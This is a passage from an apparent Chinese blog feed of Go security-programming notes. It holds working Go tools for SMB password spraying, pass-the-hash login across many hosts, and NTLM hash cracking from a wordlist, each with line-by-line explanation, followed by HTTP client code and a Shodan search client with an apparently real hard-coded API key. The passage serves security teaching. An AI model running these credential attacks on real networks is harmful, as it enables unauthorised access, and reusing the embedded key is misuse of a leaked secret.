class="string">&quot;Usage:main &lt;/user/file&gt; &lt;password&gt; &lt;domain&gt; &lt;target_host&gt;&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">buf ,err := ioutil.ReadFile(os.Args[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line">options := smb.Options &#123;</span><br><span class="line">Password: os.Args[<span class="number">2</span>],</span><br><span class="line">Domain: os.Args[<span class="number">3</span>],</span><br><span class="line">Host: os.Args[<span class="number">4</span>],</span><br><span class="line">Port: <span class="number">445</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">users := bytes.Split(buf,[]<span class="type">byte</span>&#123;<span class="string">&#x27;\n&#x27;</span>&#125;)</span><br><span class="line"><span class="keyword">for</span> _,user := <span class="keyword">range</span> users &#123;</span><br><span class="line">options.User = <span class="type">string</span>(user)</span><br><span class="line">session, err := smb.NewSession(options, <span class="literal">false</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;[-] Login failed: %s\\%s [%s]\n&quot;</span>,</span><br><span class="line">options.Domain,</span><br><span class="line">options.User,</span><br><span class="line">options.Password)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> session.Close()</span><br><span class="line"><span class="keyword">if</span> session.IsAuthenticated &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;[+] Success : %s\\%s [%s]\n&quot;</span>,</span><br><span class="line">options.Domain,</span><br><span class="line">options.User,</span><br><span class="line">options.Password)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先，我们来编写一个利用smb对域密码进行爆破的工具，在21行，我们首先利用作者写好的smb包创建一个smb消息，其中包括了域、密码、主机地址和端口，然后从我们的用户字典中读取用户名，此时一个完整的smb需要的结构体需要的内容已经被补齐。然后利用smb包创建一个Session并发送给主机验证（31行），这个函数在后台进行了大量的操作，包括协商SMB防疫和身份验证机制，然后对远程目标进行身份验证，如果身份验证失败，该函数将返回错误，并根据结果填充结果题session中布尔类型的字段IsAuthenticated。然后检查该值来判断认证是否成功。</p><h2 id="通过pass-the-hash技术重用密码"><a href="#通过pass-the-hash技术重用密码" class="headerlink" title="通过pass-the-hash技术重用密码"></a>通过pass-the-hash技术重用密码</h2><p>通过pass-the-hashJishu ,即使我们没有明文密码，我们也可以使用密码的NTLM散列进行SMB身份验证。其之所以有效，是因为在域中存储在任意地方的散列值都被认为是预先计算好的，因此我们不需要提供域、用户和密码来计算用户的散列值。</p><p>go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;bytes&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;github.com/blackhat-go/bhg/ch-6/smb/smb&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(os.Args) != <span class="number">5</span> &#123;</span><br><span class="line">log.Fatalln(<span class="string">&quot;Usage:main &lt;target/hosts&gt; &lt;user&gt; &lt;domain&gt; &lt;hash&gt;&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">buf , err := ioutil.ReadFile(os.Args[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">options := smb.Options&#123;</span><br><span class="line">User : os.Args[<span class="number">2</span>],</span><br><span class="line">Domain : os.Args[<span class="number">3</span>],</span><br><span class="line">Hash : os.Args[<span class="number">4</span>],</span><br><span class="line">Port : <span class="number">445</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">targets := bytes.Split(buf, []<span class="type">byte</span>&#123;<span class="string">&#x27;\n&#x27;</span>&#125;)</span><br><span class="line"><span class="keyword">for</span> _,target := <span class="keyword">range</span> targets &#123;</span><br><span class="line">options.Host = <span class="type">string</span>(target)</span><br><span class="line"></span><br><span class="line">session, err := smb.NewSession(options,<span class="literal">false</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;[-] Login failed [%s]: %s \n&quot;</span>,options.Host,err)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> session.Close()</span><br><span class="line"><span class="keyword">if</span> session.IsAuthenticated &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;[+] Login successful [%s]\n&quot;</span>,options.Host)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，该代码与上面的代码基本上相似，不同的是我们这次在smb的结构体定义中直接使用了hash，然后在下面32行定义目标主机，直接将定义好的结构体发送。</p><h2 id="恢复NTLM密码"><a href="#恢复NTLM密码" class="headerlink" title="恢复NTLM密码"></a>恢复NTLM密码</h2><p>在某些情况下，我们仅仅使用密码散列不足以构成整个攻击链，，许多服务，如远程桌面等都不支持基于散列的身份验证。我们如果需要访问其中的一项服务，则我们需要明文密码。</p><p>go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;bytes&quot;</span></span><br><span class="line"><span class="string">&quot;encoding/hex&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/blackhat-go/bhg/ch-6/smb/ntlmssp&quot;</span></span><br><span class="line"><span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(os.Args) != <span class="number">5</span> &#123;</span><br><span class="line">log.Fatalln(<span class="string">&quot;Usage: main &lt;dictionarg/file&gt; &lt;user&gt; &lt;domain&gt; &lt;hash&gt;&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">hash := <span class="built_in">make</span>([]<span class="type">byte</span>,<span class="built_in">len</span>(os.Args[<span class="number">4</span>])/<span class="number">2</span>)</span><br><span class="line">_, err := hex.Decode(hash, []<span class="type">byte</span>(os.Args[<span class="number">4</span>]))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line">f , err := ioutil.ReadFile(os.Args[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> found <span class="type">string</span></span><br><span class="line">passwords := bytes.Split(f, []<span class="type">byte</span>&#123;<span class="string">&#x27;\n&#x27;</span>&#125;)</span><br><span class="line"><span class="keyword">for</span> _, password := <span class="keyword">range</span> passwords &#123;</span><br><span class="line">h := ntlmssp.Ntowfv2(<span class="type">string</span>(password), os.Args[<span class="number">2</span>], os.Args[<span class="number">3</span>])</span><br><span class="line"><span class="keyword">if</span> bytes.Equal(hash,h) &#123;</span><br><span class="line">found = <span class="type">string</span>(password)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> found != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">fmt.Printf(<span class="string">&quot;[+] Recovered password: %s\n&quot;</span>, found)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;[-] Failed to recover password&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如上代码，我们首先将散列值作为命令行参数读取，然后将其解码为[]byte(18行)。然后遍历提供的密码字典，通过Ntowfv2函数来计算每个条目的散列值。最后将计算出的散列值与已提供的值进行对比，从而得到明文密码。</p>]]></content>
      
      
      <categories>
          
          <category> Go渗透编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>3.HTTP客户端以及与工具的远程交互</title>
      <link href="/2023/02/01/Go/3.HTTP%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%A5%E5%8F%8A%E4%B8%8E%E5%B7%A5%E5%85%B7%E7%9A%84%E8%BF%9C%E7%A8%8B%E4%BA%A4%E4%BA%92/"/>
      <url>/2023/02/01/Go/3.HTTP%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%A5%E5%8F%8A%E4%B8%8E%E5%B7%A5%E5%85%B7%E7%9A%84%E8%BF%9C%E7%A8%8B%E4%BA%A4%E4%BA%92/</url>
      
        <content type="html"><![CDATA[<h4 id="HTTP-API"><a href="#HTTP-API" class="headerlink" title="HTTP API"></a>HTTP API</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Get(url <span class="type">string</span>) (resp *Response, err <span class="type">error</span>)</span><br><span class="line">Head(url <span class="type">string</span>) (resp *Response, err <span class="type">error</span>)</span><br><span class="line">Post(url <span class="type">string</span>, bodyType <span class="type">string</span>, body io.Reader) (resp *Response, err <span class="type">error</span>) <span class="comment">//bodyType接收Content-Type HTTP标头</span></span><br><span class="line">PostForm(url <span class="type">string</span>, data url.Values) (resp *Response, err <span class="type">error</span>)</span><br></pre></td></tr></table></figure><h4 id="生成一个请求"><a href="#生成一个请求" class="headerlink" title="生成一个请求"></a>生成一个请求</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//http.NewReques函数原型</span></span><br><span class="line">http.NewRequest(method, url <span class="type">string</span>, body io.Reader) (req *Request, err <span class="type">error</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//for ex1: 一个没有HTTP正文的调用，即一个DELETE调用</span></span><br><span class="line">req, err := http.NewRequest(<span class="string">&quot;DELETE&quot;</span>, <span class="string">&quot;https://www.google.com/robots.txt&quot;</span>, <span class="literal">nil</span>)</span><br><span class="line"><span class="keyword">var</span> client http.Client</span><br><span class="line">resp, err := client.Do(req)</span><br><span class="line"></span><br><span class="line"><span class="comment">//for ex2: 一个PUT请求(类似PATCH请求)</span></span><br><span class="line">form := url.Values()</span><br><span class="line">form.Add(<span class="string">&quot;foo&quot;</span>, <span class="string">&quot;bar&quot;</span>)</span><br><span class="line"><span class="keyword">var</span> client http.Client</span><br><span class="line">req, err := http.NewRequest(</span><br><span class="line">    <span class="string">&quot;PUT&quot;</span>, </span><br><span class="line">    <span class="string">&quot;https://www.google.com/robots.txt&quot;</span>,                strings.NewReader(form.Encode())</span><br><span class="line">)</span><br><span class="line">resp, err := client.Do(req) <span class="comment">//读取响应正文并关闭</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="使用结构化响应解析"><a href="#使用结构化响应解析" class="headerlink" title="使用结构化响应解析"></a>使用结构化响应解析</h4><h5 id="处理HTTP响应正文"><a href="#处理HTTP响应正文" class="headerlink" title="处理HTTP响应正文"></a>处理HTTP响应正文</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">resp, _ := http.Get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">fmt.Println(resp.Status)</span><br><span class="line">body, _ := ioutil.ReadAll(resp.Body)</span><br><span class="line">fmr.Println(<span class="type">string</span>(body))</span><br><span class="line">resp.Body.Close() <span class="comment">// Response类型包含一个可输出参数Body.其类型为io.ReadCloser</span></span><br></pre></td></tr></table></figure><h5 id="解码JSON响应正文"><a href="#解码JSON响应正文" class="headerlink" title="解码JSON响应正文"></a>解码JSON响应正文</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Status <span class="keyword">struct</span> &#123;</span><br><span class="line">   Message <span class="type">string</span></span><br><span class="line">   Status  <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   res, err := http.Post(</span><br><span class="line">      <span class="string">&quot;http://127.0.0.1:3790/import&quot;</span>,</span><br><span class="line">      <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">      <span class="literal">nil</span>,</span><br><span class="line">   )</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      log.Fatalln(err)</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">var</span> status Status</span><br><span class="line">   <span class="keyword">if</span> err := json.NewDecoder(res.Body).Decode(&amp;status); err != <span class="literal">nil</span> &#123;</span><br><span class="line">      log.Fatalln(err)</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">defer</span> res.Body.Close()</span><br><span class="line">   log.Printf(<span class="string">&quot;%s -&gt; %s\n&quot;</span>, status.Status, status.Message)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="构建与Shodan交互的HTTP客户端"><a href="#构建与Shodan交互的HTTP客户端" class="headerlink" title="构建与Shodan交互的HTTP客户端"></a>构建与Shodan交互的HTTP客户端</h4><h5 id="shodan-go"><a href="#shodan-go" class="headerlink" title="shodan.go"></a>shodan.go</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> BaseURL = <span class="string">&quot;https://api.shodan.io&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Client <span class="keyword">struct</span> &#123;</span><br><span class="line">   apiKey <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">New</span><span class="params">(apiKey <span class="type">string</span>)</span></span> *Client &#123;</span><br><span class="line">   <span class="keyword">return</span> &amp;Client&#123;apiKey: apiKey&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="api-go"><a href="#api-go" class="headerlink" title="api.go"></a>api.go</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> APIInfo <span class="keyword">struct</span> &#123;</span><br><span class="line">   QueryCredits <span class="type">int</span>    <span class="string">`json:&quot;query_credits&quot;`</span></span><br><span class="line">   ScanCredits  <span class="type">int</span>    <span class="string">`json:&quot;scan_credits&quot;`</span></span><br><span class="line">   Telnet       <span class="type">bool</span>   <span class="string">`json:&quot;telnet&quot;`</span></span><br><span class="line">   Plan         <span class="type">string</span> <span class="string">`json:&quot;plan&quot;`</span></span><br><span class="line">   Https        <span class="type">bool</span>   <span class="string">`json:&quot;https&quot;`</span></span><br><span class="line">   Unlocked     <span class="type">bool</span>   <span class="string">`json:&quot;unlocked&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Client)</span></span> APIInfo() (*APIInfo, <span class="type">error</span>) &#123;</span><br><span class="line">   res, err := http.Get(fmt.Sprintf(<span class="string">&quot;%s/api-info?key=%s&quot;</span>, BaseURL, s.apiKey))</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">defer</span> res.Body.Close()</span><br><span class="line">   <span class="keyword">var</span> ret APIInfo <span class="comment">//返回内容</span></span><br><span class="line">   <span class="keyword">if</span> err := json.NewDecoder(res.Body).Decode(&amp;ret); err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> &amp;ret, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="host-go"><a href="#host-go" class="headerlink" title="host.go"></a>host.go</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> HostLocation <span class="keyword">struct</span> &#123;</span><br><span class="line">   City         <span class="type">string</span>  <span class="string">`json:&quot;city&quot;`</span></span><br><span class="line">   RegionCode   <span class="type">string</span>  <span class="string">`json:&quot;region_code&quot;`</span></span><br><span class="line">   AreaCode     <span class="type">int</span>     <span class="string">`json:&quot;area_code&quot;`</span></span><br><span class="line">   Longitude    <span class="type">float32</span> <span class="string">`json:&quot;longitude&quot;`</span></span><br><span class="line">   CountryCode3 <span class="type">string</span>  <span class="string">`json:&quot;country_code3&quot;`</span></span><br><span class="line">   CountryName  <span class="type">string</span>  <span class="string">`json:&quot;country_name&quot;`</span></span><br><span class="line">   PostalCode   <span class="type">string</span>  <span class="string">`json:&quot;postal_code&quot;`</span></span><br><span class="line">   DMACode      <span class="type">int</span>     <span class="string">`json:&quot;dma_code&quot;`</span></span><br><span class="line">   CountryCode  <span class="type">string</span>  <span class="string">`json:&quot;country_code&quot;`</span></span><br><span class="line">   Latitude     <span class="type">float32</span> <span class="string">`json:&quot;latitude&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Host <span class="keyword">struct</span> &#123;</span><br><span class="line">   OS        <span class="type">string</span>       <span class="string">`json:&quot;os&quot;`</span></span><br><span class="line">   Timestamp <span class="type">string</span>       <span class="string">`json:&quot;timestamp&quot;`</span></span><br><span class="line">   ISP       <span class="type">string</span>       <span class="string">`json:&quot;isp&quot;`</span></span><br><span class="line">   ASN       <span class="type">string</span>       <span class="string">`json:&quot;asn&quot;`</span></span><br><span class="line">   Hostnames []<span class="type">string</span>     <span class="string">`json:&quot;hostnames&quot;`</span></span><br><span class="line">   Location  HostLocation <span class="string">`json:&quot;location&quot;`</span></span><br><span class="line">   IP        <span class="type">int64</span>        <span class="string">`json:&quot;ip&quot;`</span></span><br><span class="line">   Domains   []<span class="type">string</span>     <span class="string">`json:&quot;domains&quot;`</span></span><br><span class="line">   Org       <span class="type">string</span>       <span class="string">`json:&quot;org&quot;`</span></span><br><span class="line">   Data      <span class="type">string</span>       <span class="string">`json:&quot;data&quot;`</span></span><br><span class="line">   Port      <span class="type">int</span>          <span class="string">`json:&quot;port&quot;`</span></span><br><span class="line">   IPString  <span class="type">string</span>       <span class="string">`json:&quot;ip_str&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> HostSearch <span class="keyword">struct</span> &#123;</span><br><span class="line">   Matches []Host <span class="string">`json:&quot;matches&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *Client)</span></span> HostSearch(q <span class="type">string</span>) (*HostSearch, <span class="type">error</span>) &#123;</span><br><span class="line">   res, err := http.Get(</span><br><span class="line">      fmt.Sprintf(<span class="string">&quot;%s/shodan/host/search?key=%s&amp;query=%s&quot;</span>, BaseURL, s.apiKey, q), <span class="comment">//shodan的查询接口</span></span><br><span class="line">   )</span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">defer</span> res.Body.Close()</span><br><span class="line"></span><br><span class="line">   <span class="keyword">var</span> ret HostSearch</span><br><span class="line">   <span class="keyword">if</span> err := json.NewDecoder(res.Body).Decode(&amp;ret); err != <span class="literal">nil</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> &amp;ret, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="main-go"><a href="#main-go" class="headerlink" title="main.go"></a>main.go</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   <span class="keyword">if</span> <span class="built_in">len</span>(os.Args) != <span class="number">2</span> &#123;</span><br><span class="line">      log.Fatalln(<span class="string">&quot;Usage: main &lt;searchterm&gt;&quot;</span>)</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">//apiKey := os.Getenv(&quot;SHODAN_API_KEY&quot;)</span></span><br><span class="line">   apiKey := <span class="string">&quot;YQchKbHxjEgzXUqoR1qbtxec79P23owU&quot;</span></span><br><span class="line">   s := shodan.New(apiKey)  <span class="comment">//新建key</span></span><br><span class="line">   info, err := s.APIInfo() <span class="comment">//API信息</span></span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      log.Panicln(err)</span><br><span class="line">   &#125;</span><br><span class="line">   fmt.Printf(</span><br><span class="line">      <span class="string">&quot;Query Credits: %d\nScan Credits:  %d\n\n&quot;</span>,</span><br><span class="line">      info.QueryCredits,</span><br><span class="line">      info.ScanCredits)</span><br><span class="line"></span><br><span class="line">   hostSearch, err := s.HostSearch(os.Args[<span class="number">1</span>]) <span class="comment">//根据命令行第二个参数去查找含有该字符串的主机</span></span><br><span class="line">   <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">      log.Panicln(err)</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">for</span> _, host := <span class="keyword">range</span> hostSearch.Matches &#123;</span><br><span class="line">      fmt.Printf(<span class="string">&quot;%18s:%d\n&quot;</span>, host.IPString, host.Port)</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Go渗透编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全开发 </tag>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>4.HTTP服务器、路由和中间件</title>
      <link href="/2023/02/01/Go/4.HTTP%E6%9C%8D%E5%8A%A1%E5%99%A8%E3%80%81%E8%B7%AF%E7%94%B1%E5%92%8C%E4%B8%AD%E9%97%B4%E4%BB%B6/"/>
      <url>/2023/02/01/Go/4.HTTP%E6%9C%8D%E5%8A%A1%E5%99%A8%E3%80%81%E8%B7%AF%E7%94%B1%E5%92%8C%E4%B8%AD%E9%97%B4%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h3 id="HTTP服务端基础"><a href="#HTTP服务端基础" class="headerlink" title="HTTP服务端基础"></a>HTTP服务端基础</h3><h4 id="构造一个简单的echo服务器"><a href="#构造一个简单的echo服务器" class="headerlink" title="构造一个简单的echo服务器"></a>构造一个简单的echo服务器</h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">hello</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line">   fmt.Fprintf(w, <span class="string">&quot;Hello %s\n&quot;</span>, r.URL.Query().Get(<span class="string">&quot;name&quot;</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   http.HandleFunc(<span class="string">&quot;/hello&quot;</span>, hello)</span><br><span class="line">   http.ListenAndServe(<span class="string">&quot;:8000&quot;</span>, <span 